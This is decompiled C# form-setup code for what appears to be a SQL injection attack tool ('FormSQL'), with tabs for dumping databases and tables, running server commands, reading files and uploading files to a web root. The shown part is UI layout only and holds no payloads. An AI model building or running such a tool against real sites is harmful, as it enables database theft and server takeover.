		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got Unknown
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0391: Expected O, but got Unknown
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d3: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Expected O, but got Unknown
		//IL_0400: Unknown result type (might be due to invalid IL or missing references)
		//IL_040a: Expected O, but got Unknown
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Expected O, but got Unknown
		//IL_0416: Unknown result type (might be due to invalid IL or missing references)
		//IL_0420: Expected O, but got Unknown
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Expected O, but got Unknown
		//IL_042c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0436: Expected O, but got Unknown
		//IL_0437: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		//IL_0442: Unknown result type (might be due to invalid IL or missing references)
		//IL_044c: Expected O, but got Unknown
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0457: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		//IL_0463: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Expected O, but got Unknown
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0478: Expected O, but got Unknown
		//IL_0479: Unknown result type (might be due to invalid IL or missing references)
		//IL_0483: Expected O, but got Unknown
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_048e: Expected O, but got Unknown
		//IL_048f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0499: Expected O, but got Unknown
		//IL_049a: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a4: Expected O, but got Unknown
		//IL_04a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Expected O, but got Unknown
		//IL_04b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ba: Expected O, but got Unknown
		//IL_04bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Expected O, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Expected O, but got Unknown
		//IL_04d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04db: Expected O, but got Unknown
		//IL_04dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Expected O, but got Unknown
		//IL_04e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f1: Expected O, but got Unknown
		//IL_04f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fc: Expected O, but got Unknown
		//IL_04fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0507: Expected O, but got Unknown
		//IL_0508: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Expected O, but got Unknown
		//IL_0765: Unknown result type (might be due to invalid IL or missing references)
		//IL_0879: Unknown result type (might be due to invalid IL or missing references)
		//IL_0883: Expected O, but got Unknown
		//IL_09b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c2: Expected O, but got Unknown
		//IL_0a93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bda: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be4: Expected O, but got Unknown
		//IL_0c42: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ca5: Expected O, but got Unknown
		//IL_0cb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cbc: Expected O, but got Unknown
		//IL_0cc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd3: Expected O, but got Unknown
		//IL_0ce0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cea: Expected O, but got Unknown
		//IL_0cfb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d05: Expected O, but got Unknown
		//IL_10ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b8: Expected O, but got Unknown
		//IL_1153: Unknown result type (might be due to invalid IL or missing references)
		//IL_115d: Expected O, but got Unknown
		//IL_11f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1202: Expected O, but got Unknown
		//IL_129d: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a7: Expected O, but got Unknown
		//IL_1342: Unknown result type (might be due to invalid IL or missing references)
		//IL_134c: Expected O, but got Unknown
		//IL_140a: Unknown result type (might be due to invalid IL or missing references)
		//IL_146f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1479: Expected O, but got Unknown
		//IL_169f: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a9: Expected O, but got Unknown
		//IL_1744: Unknown result type (might be due to invalid IL or missing references)
		//IL_174e: Expected O, but got Unknown
		//IL_1a2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a35: Expected O, but got Unknown
		//IL_1bdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1be7: Expected O, but got Unknown
		//IL_1eae: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eb8: Expected O, but got Unknown
		//IL_398a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3994: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FormSQL));
		tabSQLInjection = new TabControl();
		tabEnv = new TabPage();
		listViewEnv = new ListView();
		columnHeader_0 = new ColumnHeader();
		columnHeader_1 = new ColumnHeader();
		toolStripEnv = new ToolStrip();
		toolStripSeparator11 = new ToolStripSeparator();
		btnGetInfo = new ToolStripButton();
		toolStripSeparator12 = new ToolStripSeparator();
		tabDatabase = new TabPage();
		splitDB = new SplitContainer();
		treeViewDB = new TreeView();
		imageList_0 = new ImageList(icontainer_0);
		toolStripDB = new ToolStrip();
		cmbChkAllDB = new ToolStripComboBox();
		toolStripSeparator8 = new ToolStripSeparator();
		btnGetDB = new ToolStripButton();
		toolStripSeparator4 = new ToolStripSeparator();
		btnGetTable = new ToolStripButton();
		toolStripSeparator5 = new ToolStripSeparator();
		btnGetColumn = new ToolStripButton();
		toolStripSeparator6 = new ToolStripSeparator();
		btnImpDB = new ToolStripButton();
		toolStripSeparator17 = new ToolStripSeparator();
		btnExpDB = new ToolStripButton();
		toolStripSeparator19 = new ToolStripSeparator();
		listViewData = new ListView();
		toolStripData = new ToolStrip();
		toolStripLabel4 = new ToolStripLabel();
		txtRowsBegin = new ToolStripTextBox();
		toolStripLabel5 = new ToolStripLabel();
		txtRowsEnd = new ToolStripTextBox();
		toolStripSeparator7 = new ToolStripSeparator();
		btnGetData = new ToolStripButton();
		toolStripSeparator9 = new ToolStripSeparator();
		btnExpData = new ToolStripButton();
		toolStripSeparator18 = new ToolStripSeparator();
		tabCMD = new TabPage();
		listBoxCMD = new ListBox();
		toolStripDBCMD = new ToolStrip();
		toolStripSeparator15 = new ToolStripSeparator();
		txtDBCMD = new ToolStripTextBox();
		btnDBCMD = new ToolStripButton();
		toolStripSeparator16 = new ToolStripSeparator();
		toolStripCommand = new ToolStrip();
		toolStripSeparator13 = new ToolStripSeparator();
		txtCMD = new ToolStripTextBox();
		btnCMD = new ToolStripButton();
		toolStripSeparator14 = new ToolStripSeparator();
		tabFileReader = new TabPage();
		txtFileContent = new TextBox();
		toolFileReader = new ToolStrip();
		toolStripLabel6 = new ToolStripLabel();
		txtFileName = new ToolStripTextBox();
		btnReadFile = new ToolStripButton();
		toolStripSeparator10 = new ToolStripSeparator();
		tabFileUploader = new TabPage();
		btnGetWebRoot = new Button();
		label3 = new Label();
		txtTargetFileName = new TextBox();
		label2 = new Label();
		btnSelectFile = new Button();
		btnFileUpload = new Button();
		txtUploadFile = new TextBox();
		tabEscapeString = new TabPage();
		label17 = new Label();
		label16 = new Label();
		btnEncode = new Button();
		txtEscapeString = new TextBox();
		txtSourceString = new TextBox();
		label6 = new Label();
		label5 = new Label();
		tabDebug = new TabPage();
		grpBlindType = new GroupBox();
		label20 = new Label();
		label21 = new Label();
		label22 = new Label();
		ComboBoxWebEncoding = new ComboBox();
		label19 = new Label();
		ComboBoxDBEncoding = new ComboBox();
		label18 = new Label();
		txtComment = new TextBox();
		lblComment = new Label();
		label4 = new Label();
		label1 = new Label();
		radioCrossSite = new RadioButton();
		label15 = new Label();
		label14 = new Label();
		label13 = new Label();
		label12 = new Label();
		label11 = new Label();
		label10 = new Label();
		txtWildField = new TextBox();
		label9 = new Label();
		btnSetEnv = new Button();
		btnGetEnv = new Button();
		label8 = new Label();
		txtInjectField = new TextBox();
		label7 = new Label();
		txtFieldNum = new TextBox();
		radioBlind = new RadioButton();
		radioFieldEcho = new RadioButton();
		radioPlainText = new RadioButton();
		toolStripSQL = new ToolStrip();
		toolStripLabel1 = new ToolStripLabel();
		cmbDBTypeList = new ToolStripComboBox();
		toolStripSeparator1 = new ToolStripSeparator();
		toolStripLabel2 = new ToolStripLabel();
		txtKeyWord = new ToolStripTextBox();
		toolStripSeparator2 = new ToolStripSeparator();
		toolStripLabel3 = new ToolStripLabel();
		cmbInjectionType = new ToolStripComboBox();
		toolStripSeparator3 = new ToolStripSeparator();
		ButtonResetSQL = new ToolStripButton();
		toolStripSeparator20 = new ToolStripSeparator();
		((Control)tabSQLInjection).SuspendLayout();
		((Control)tabEnv).SuspendLayout();
		((Control)toolStripEnv).SuspendLayout();
		((Control)tabDatabase).SuspendLayout();
		((Control)splitDB.get_Panel1()).SuspendLayout();
		((Control)splitDB.get_Panel2()).SuspendLayout();
		((Control)splitDB).SuspendLayout();
		((Control)toolStripDB).SuspendLayout();
		((Control)toolStripData).SuspendLayout();
		((Control)tabCMD).SuspendLayout();
		((Control)toolStripDBCMD).SuspendLayout();
		((Control)toolStripCommand).SuspendLayout();
		((Control)tabFileReader).SuspendLayout();
		((Control)toolFileReader).SuspendLayout();
		((Control)tabFileUploader).SuspendLayout();
		((Control)tabEscapeString).SuspendLayout();
		((Control)tabDebug).SuspendLayout();
		((Control)grpBlindType).SuspendLayout();
		((Control)toolStripSQL).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabEnv);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabDatabase);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabCMD);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabFileReader);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabFileUploader);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabEscapeString);
		((Control)tabSQLInjection).get_Controls().Add((Control)(object)tabDebug);
		((Control)tabSQLInjection).set_Dock((DockStyle)5);
		tabSQLInjection.set_ImageList(imageList_0);
		((Control)tabSQLInjection).set_Location(new Point(0, 25));
		((Control)tabSQLInjection).set_Name("tabSQLInjection");
		tabSQLInjection.set_SelectedIndex(0);
		((Control)tabSQLInjection).set_Size(new Size(685, 391));
		((Control)tabSQLInjection).set_TabIndex(0);
		((Control)tabEnv).get_Controls().Add((Control)(object)listViewEnv);
		((Control)tabEnv).get_Controls().Add((Control)(object)toolStripEnv);
		tabEnv.set_ImageKey("env.png");
		tabEnv.set_Location(new Point(4, 23));
		((Control)tabEnv).set_Name("tabEnv");
		((Control)tabEnv).set_Padding(new Padding(3));
		((Control)tabEnv).set_Size(new Size(677, 364));
		tabEnv.set_TabIndex(0);
		((Control)tabEnv).set_Text("Environment");
		tabEnv.set_UseVisualStyleBackColor(true);
		listViewEnv.set_CheckBoxes(true);
		listViewEnv.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { columnHeader_0, columnHeader_1 });
		((Control)listViewEnv).set_Dock((DockStyle)5);
		listViewEnv.set_FullRowSelect(true);
		((Control)listViewEnv).set_Location(new Point(3, 3));
		listViewEnv.set_MultiSelect(false);
		((Control)listViewEnv).set_Name("listViewEnv");
		((Control)listViewEnv).set_Size(new Size(671, 333));
		((Control)listViewEnv).set_TabIndex(14);
		listViewEnv.set_UseCompatibleStateImageBehavior(false);
		listViewEnv.set_View((View)1);
		((Control)listViewEnv).add_MouseClick(new MouseEventHandler(listViewEnv_MouseClick));
		columnHeader_0.set_Text("Environment");
		columnHeader_0.set_Width(194);
		columnHeader_1.set_Text("Value");
		columnHeader_1.set_Width(480);
		toolStripEnv.set_BackColor(SystemColors.ButtonFace);
		((Control)toolStripEnv).set_Dock((DockStyle)2);
		toolStripEnv.set_GripStyle((ToolStripGripStyle)0);
		toolStripEnv.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)toolStripSeparator11,
			(ToolStripItem)btnGetInfo,
			(ToolStripItem)toolStripSeparator12
		});
		((Control)toolStripEnv).set_Location(new Point(3, 336));
		((Control)toolStripEnv).set_Name("toolStripEnv");
		((Control)toolStripEnv).set_Size(new Size(671, 25));
		((Control)toolStripEnv).set_TabIndex(13);
		((Control)toolStripEnv).set_Text("toolStrip1");
		((ToolStripItem)toolStripSeparator11).set_Name("toolStripSeparator11");
		((ToolStripItem)toolStripSeparator11).set_Size(new Size(6, 25));
		((ToolStripItem)btnGetInfo).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnGetInfo).set_Image((Image)componentResourceManager.GetObject("btnGetInfo.Image"));
		((ToolStripItem)btnGetInfo).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnGetInfo).set_Name("btnGetInfo");
		((ToolStripItem)btnGetInfo).set_Size(new Size(165, 22));
		((ToolStripItem)btnGetInfo).set_Text("Get Environment Infomation");
		((ToolStripItem)btnGetInfo).add_Click((EventHandler)btnGetInfo_Click);
		((ToolStripItem)toolStripSeparator12).set_Name("toolStripSeparator12");
		((ToolStripItem)toolStripSeparator12).set_Size(new Size(6, 25));
		((Control)tabDatabase).get_Controls().Add((Control)(object)splitDB);
		tabDatabase.set_ImageKey("db.png");
		tabDatabase.set_Location(new Point(4, 23));
		((Control)tabDatabase).set_Name("tabDatabase");
		((Control)tabDatabase).set_Padding(new Padding(3));
		((Control)tabDatabase).set_Size(new Size(677, 364));
		tabDatabase.set_TabIndex(1);
		((Control)tabDatabase).set_Text("DataBase");
		tabDatabase.set_UseVisualStyleBackColor(true);
		splitDB.set_Dock((DockStyle)5);
		((Control)splitDB).set_Location(new Point(3, 3));
		((Control)splitDB).set_Name("splitDB");
		((Control)splitDB.get_Panel1()).get_Controls().Add((Control)(object)treeViewDB);
		((Control)splitDB.get_Panel1()).get_Controls().Add((Control)(object)toolStripDB);
		((Control)splitDB.get_Panel2()).get_Controls().Add((Control)(object)listViewData);
		((Control)splitDB.get_Panel2()).get_Controls().Add((Control)(object)toolStripData);
		((Control)splitDB).set_Size(new Size(671, 358));
		splitDB.set_SplitterDistance(341);
		((Control)splitDB).set_TabIndex(0);
		treeViewDB.set_CheckBoxes(true);
		((Control)treeViewDB).set_Dock((DockStyle)5);
		((Control)treeViewDB).set_Font(new Font("Arial", 10.5f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		treeViewDB.set_FullRowSelect(true);
		treeViewDB.set_ImageIndex(0);
		treeViewDB.set_ImageList(imageList_0);
		treeViewDB.set_Indent(40);
		treeViewDB.set_LabelEdit(true);
		((Control)treeViewDB).set_Location(new Point(0, 0));
		((Control)treeViewDB).set_Margin(new Padding(3, 4, 3, 4));
		((Control)treeViewDB).set_Name("treeViewDB");
		treeViewDB.set_SelectedImageIndex(0);
		((Control)treeViewDB).set_Size(new Size(341, 333));
		((Control)treeViewDB).set_TabIndex(2);
		treeViewDB.add_AfterCheck(new TreeViewEventHandler(treeViewDB_AfterCheck));
		((Control)treeViewDB).add_MouseDown(new MouseEventHandler(treeViewDB_MouseDown));
		treeViewDB.add_NodeMouseClick(new TreeNodeMouseClickEventHandler(treeViewDB_NodeMouseClick));
		treeViewDB.add_BeforeCheck(new TreeViewCancelEventHandler(treeViewDB_BeforeCheck));
		imageList_0.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("WCRImageList.ImageStream"));
		imageList_0.set_TransparentColor(Color.Transparent);
		imageList_0.get_Images().SetKeyName(0, "select.png");
		imageList_0.get_Images().SetKeyName(1, "ie.png");
		imageList_0.get_Images().SetKeyName(2, "scan.png");
		imageList_0.get_Images().SetKeyName(3, "env.png");
		imageList_0.get_Images().SetKeyName(4, "db.png");
		imageList_0.get_Images().SetKeyName(5, "cmd.png");
		imageList_0.get_Images().SetKeyName(6, "admin.png");
		imageList_0.get_Images().SetKeyName(7, "file.png");
		imageList_0.get_Images().SetKeyName(8, "xss.png");
		imageList_0.get_Images().SetKeyName(9, "tool.png");
		imageList_0.get_Images().SetKeyName(10, "code.png");
		imageList_0.get_Images().SetKeyName(11, "about.png");
		imageList_0.get_Images().SetKeyName(12, "go.png");
		imageList_0.get_Images().SetKeyName(13, "start.png");
		imageList_0.get_Images().SetKeyName(14, "pause.png");
		imageList_0.get_Images().SetKeyName(15, "stop.png");
		imageList_0.get_Images().SetKeyName(16, "table.png");
		imageList_0.get_Images().SetKeyName(17, "column.png");
		imageList_0.get_Images().SetKeyName(18, "vul.png");
		imageList_0.get_Images().SetKeyName(19, "upload.png");
		imageList_0.get_Images().SetKeyName(20, "report.png");
		imageList_0.get_Images().SetKeyName(21, "escape.png");
		toolStripDB.set_BackColor(SystemColors.ButtonFace);
		((Control)toolStripDB).set_Dock((DockStyle)2);
		toolStripDB.set_GripStyle((ToolStripGripStyle)0);
		toolStripDB.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[12]
		{
			(ToolStripItem)cmbChkAllDB,
			(ToolStripItem)toolStripSeparator8,
			(ToolStripItem)btnGetDB,
			(ToolStripItem)toolStripSeparator4,
			(ToolStripItem)btnGetTable,
			(ToolStripItem)toolStripSeparator5,
			(ToolStripItem)btnGetColumn,
			(ToolStripItem)toolStripSeparator6,
			(ToolStripItem)btnImpDB,
			(ToolStripItem)toolStripSeparator17,
			(ToolStripItem)btnExpDB,
			(ToolStripItem)toolStripSeparator19
		});
		((Control)toolStripDB).set_Location(new Point(0, 333));
		((Control)toolStripDB).set_Name("toolStripDB");
		((Control)toolStripDB).set_Size(new Size(341, 25));
		((Control)toolStripDB).set_TabIndex(0);
		((Control)toolStripDB).set_Text("toolStrip1");
		cmbChkAllDB.set_DropDownStyle((ComboBoxStyle)2);
		cmbChkAllDB.get_Items().AddRange(new object[2] { "Get_Current_DB_Only", "Get_All_DB" });
		((ToolStripItem)cmbChkAllDB).set_Name("cmbChkAllDB");
		((ToolStripItem)cmbChkAllDB).set_Size(new Size(130, 25));
		((ToolStripItem)toolStripSeparator8).set_Name("toolStripSeparator8");
		((ToolStripItem)toolStripSeparator8).set_Size(new Size(6, 25));
		((ToolStripItem)btnGetDB).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnGetDB).set_Image((Image)componentResourceManager.GetObject("btnGetDB.Image"));
		((ToolStripItem)btnGetDB).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnGetDB).set_Name("btnGetDB");
		((ToolStripItem)btnGetDB).set_Size(new Size(57, 22));
		((ToolStripItem)btnGetDB).set_Text("DataBase");
		((ToolStripItem)btnGetDB).add_Click((EventHandler)btnGetDB_Click);
		((ToolStripItem)toolStripSeparator4).set_Name("toolStripSeparator4");
		((ToolStripItem)toolStripSeparator4).set_Size(new Size(6, 25));
		((ToolStripItem)btnGetTable).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnGetTable).set_Image((Image)componentResourceManager.GetObject("btnGetTable.Image"));
		((ToolStripItem)btnGetTable).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnGetTable).set_Name("btnGetTable");
		((ToolStripItem)btnGetTable).set_Size(new Size(39, 22));
		((ToolStripItem)btnGetTable).set_Text("Table");
		((ToolStripItem)btnGetTable).add_Click((EventHandler)btnGetTable_Click);
		((ToolStripItem)toolStripSeparator5).set_Name("toolStripSeparator5");
		((ToolStripItem)toolStripSeparator5).set_Size(new Size(6, 25));
		((ToolStripItem)btnGetColumn).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnGetColumn).set_Image((Image)componentResourceManager.GetObject("btnGetColumn.Image"));
		((ToolStripItem)btnGetColumn).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnGetColumn).set_Name("btnGetColumn");
		((ToolStripItem)btnGetColumn).set_Size(new Size(45, 22));
		((ToolStripItem)btnGetColumn).set_Text("Column");
		((ToolStripItem)btnGetColumn).add_Click((EventHandler)btnGetColumn_Click);
		((ToolStripItem)toolStripSeparator6).set_Name("toolStripSeparator6");
		((ToolStripItem)toolStripSeparator6).set_Size(new Size(6, 25));
		((ToolStripItem)btnImpDB).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnImpDB).set_Image((Image)componentResourceManager.GetObject("btnImpDB.Image"));
		((ToolStripItem)btnImpDB).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnImpDB).set_Name("btnImpDB");
		((ToolStripItem)btnImpDB).set_Size(new Size(45, 16));
		((ToolStripItem)btnImpDB).set_Text("Import");
		((ToolStripItem)btnImpDB).add_Click((EventHandler)btnImpDB_Click);
		((ToolStripItem)toolStripSeparator17).set_Name("toolStripSeparator17");
		((ToolStripItem)toolStripSeparator17).set_Size(new Size(6, 25));
		((ToolStripItem)btnExpDB).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnExpDB).set_Image((Image)componentResourceManager.GetObject("btnExpDB.Image"));
		((ToolStripItem)btnExpDB).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnExpDB).set_Name("btnExpDB");
		((ToolStripItem)btnExpDB).set_Size(new Size(45, 16));
		((ToolStripItem)btnExpDB).set_Text("Export");
		((ToolStripItem)btnExpDB).add_Click((EventHandler)btnExpDB_Click);
		((ToolStripItem)toolStripSeparator19).set_Name("toolStripSeparator19");
		((ToolStripItem)toolStripSeparator19).set_Size(new Size(6, 25));
		listViewData.set_AllowColumnReorder(true);
		((Control)listViewData).set_Dock((DockStyle)5);
		listViewData.set_FullRowSelect(true);
		((Control)listViewData).set_Location(new Point(0, 0));
		((Control)listViewData).set_Margin(new Padding(3, 4, 3, 4));
		((Control)listViewData).set_Name("listViewData");
		((Control)listViewData).set_Size(new Size(326, 333));
		((Control)listViewData).set_TabIndex(8);
		listViewData.set_UseCompatibleStateImageBehavior(false);
		listViewData.set_View((View)1);
		((Control)listViewData).add_MouseClick(new MouseEventHandler(listViewData_MouseClick));
		toolStripData.set_BackColor(SystemColors.ButtonFace);
		((Control)toolStripData).set_Dock((DockStyle)2);
		toolStripData.set_GripStyle((ToolStripGripStyle)0);
		toolStripData.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[9]
		{
			(ToolStripItem)toolStripLabel4,
			(ToolStripItem)txtRowsBegin,
			(ToolStripItem)toolStripLabel5,
			(ToolStripItem)txtRowsEnd,
			(ToolStripItem)toolStripSeparator7,
			(ToolStripItem)btnGetData,
			(ToolStripItem)toolStripSeparator9,
			(ToolStripItem)btnExpData,
			(ToolStripItem)toolStripSeparator18
		});
		((Control)toolStripData).set_Location(new Point(0, 333));
		((Control)toolStripData).set_Name("toolStripData");
		((Control)toolStripData).set_Size(new Size(326, 25));
		((Control)toolStripData).set_TabIndex(7);
		((Control)toolStripData).set_Text("toolStrip1");
		((ToolStripItem)toolStripLabel4).set_Name("toolStripLabel4");
		((ToolStripItem)toolStripLabel4).set_Size(new Size(59, 22));
		((ToolStripItem)toolStripLabel4).set_Text("Rows From");
		((ToolStripItem)txtRowsBegin).set_Name("txtRowsBegin");
		((ToolStripItem)txtRowsBegin).set_Size(new Size(35, 25));
		((ToolStripItem)txtRowsBegin).set_Text("1");
		((ToolStripItem)txtRowsBegin).set_ToolTipText("Rows Begin( >=1)");
		((ToolStripItem)toolStripLabel5).set_Name("toolStripLabel5");
		((ToolStripItem)toolStripLabel5).set_Size(new Size(17, 22));
		((ToolStripItem)toolStripLabel5).set_Text("To");
		((ToolStripItem)txtRowsEnd).set_Name("txtRowsEnd");
		((ToolStripItem)txtRowsEnd).set_Size(new Size(35, 25));
		((ToolStripItem)txtRowsEnd).set_Text("2");
		((ToolStripItem)txtRowsEnd).set_ToolTipText("Rows End( >=1)");
		((ToolStripItem)toolStripSeparator7).set_Name("toolStripSeparator7");
		((ToolStripItem)toolStripSeparator7).set_Size(new Size(6, 25));
		((ToolStripItem)btnGetData).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnGetData).set_Image((Image)componentResourceManager.GetObject("btnGetData.Image"));
		((ToolStripItem)btnGetData).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnGetData).set_Name("btnGetData");
		((ToolStripItem)btnGetData).set_Size(new Size(33, 22));
		((ToolStripItem)btnGetData).set_Text("Data");
		((ToolStripItem)btnGetData).add_Click((EventHandler)btnGetData_Click);
		((ToolStripItem)toolStripSeparator9).set_Name("toolStripSeparator9");
		((ToolStripItem)toolStripSeparator9).set_Size(new Size(6, 25));
		((ToolStripItem)btnExpData).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnExpData).set_Image((Image)componentResourceManager.GetObject("btnExpData.Image"));
		((ToolStripItem)btnExpData).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnExpData).set_Name("btnExpData");
		((ToolStripItem)btnExpData).set_Size(new Size(45, 22));
		((ToolStripItem)btnExpData).set_Text("Export");
		((ToolStripItem)btnExpData).add_Click((EventHandler)btnExpData_Click);
		((ToolStripItem)toolStripSeparator18).set_Name("toolStripSeparator18");
		((ToolStripItem)toolStripSeparator18).set_Size(new Size(6, 25));
		((Control)tabCMD).get_Controls().Add((Control)(object)listBoxCMD);
		((Control)tabCMD).get_Controls().Add((Control)(object)toolStripDBCMD);
		((Control)tabCMD).get_Controls().Add((Control)(object)toolStripCommand);
		tabCMD.set_ImageKey("cmd.png");
		tabCMD.set_Location(new Point(4, 23));
		((Control)tabCMD).set_Name("tabCMD");
		((Control)tabCMD).set_Size(new Size(677, 364));
		tabCMD.set_TabIndex(2);
		((Control)tabCMD).set_Text("Command");
		tabCMD.set_UseVisualStyleBackColor(true);
		((Control)listBoxCMD).set_Dock((DockStyle)5);
		((ListControl)listBoxCMD).set_FormattingEnabled(true);
		listBoxCMD.set_ItemHeight(12);
		((Control)listBoxCMD).set_Location(new Point(0, 25));
		((Control)listBoxCMD).set_Name("listBoxCMD");
		((Control)listBoxCMD).set_Size(new Size(677, 304));
		((Control)listBoxCMD).set_TabIndex(8);
		toolStripDBCMD.set_BackColor(SystemColors.ButtonFace);
		((Control)toolStripDBCMD).set_Dock((DockStyle)2);
		toolStripDBCMD.set_GripStyle((ToolStripGripStyle)0);
		toolStripDBCMD.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)toolStripSeparator15,
			(ToolStripItem)txtDBCMD,
			(ToolStripItem)btnDBCMD,
			(ToolStripItem)toolStripSeparator16
		});
		((Control)toolStripDBCMD).set_Location(new Point(0, 339));
		((Control)toolStripDBCMD).set_Name("toolStripDBCMD");
		((Control)toolStripDBCMD).set_Size(new Size(677, 25));
		((Control)toolStripDBCMD).set_TabIndex(7);
		((Control)toolStripDBCMD).set_Text("toolStrip1");
		((ToolStripItem)toolStripSeparator15).set_Name("toolStripSeparator15");
		((ToolStripItem)toolStripSeparator15).set_Size(new Size(6, 25));
		((ToolStripItem)txtDBCMD).set_Name("txtDBCMD");
		((ToolStripItem)txtDBCMD).set_Size(new Size(450, 25));
		((ToolStripItem)txtDBCMD).set_Text("select * from master..sysdatabases");
		((ToolStripItem)btnDBCMD).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnDBCMD).set_Image((Image)componentResourceManager.GetObject("btnDBCMD.Image"));
		((ToolStripItem)btnDBCMD).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnDBCMD).set_Name("btnDBCMD");
		((ToolStripItem)btnDBCMD).set_Size(new Size(45, 22));
		((ToolStripItem)btnDBCMD).set_Text("DB CMD");
		((ToolStripItem)btnDBCMD).add_Click((EventHandler)btnDBCMD_Click);
		((ToolStripItem)toolStripSeparator16).set_Name("toolStripSeparator16");
		((ToolStripItem)toolStripSeparator16).set_Size(new Size(6, 25));
		toolStripCommand.set_BackColor(SystemColors.ButtonFace);
		toolStripCommand.set_GripStyle((ToolStripGripStyle)0);
		toolStripCommand.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)toolStripSeparator13,
			(ToolStripItem)txtCMD,
			(ToolStripItem)btnCMD,
			(ToolStripItem)toolStripSeparator14
		});
		((Control)toolStripCommand).set_Location(new Point(0, 0));
